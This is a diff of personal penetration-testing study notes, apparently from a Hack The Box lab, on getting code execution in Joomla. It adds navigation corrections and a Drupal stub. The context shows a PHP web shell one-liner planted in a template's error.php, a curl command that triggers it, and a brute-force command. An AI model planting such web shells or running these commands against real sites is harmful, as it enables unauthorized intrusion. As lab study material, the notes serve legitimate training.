@@ -172,7 +172,9 @@ sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/met
 ### Attacking Joomla
 * Once logged in, can get rce from adding a php script to a template
 	* click on `templates` under `configuration`
+		* htb lied; it's under `extensions`
 	* click on a template name, go to the `customise` page
+		* ex: `protostar`
 	* try using the `error.php` page
 	* One liner for ce:
 ```php
@@ -183,3 +185,7 @@ system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
 ```bash
 curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
 ```
+
+# Drupal
+* another CMS
+* 
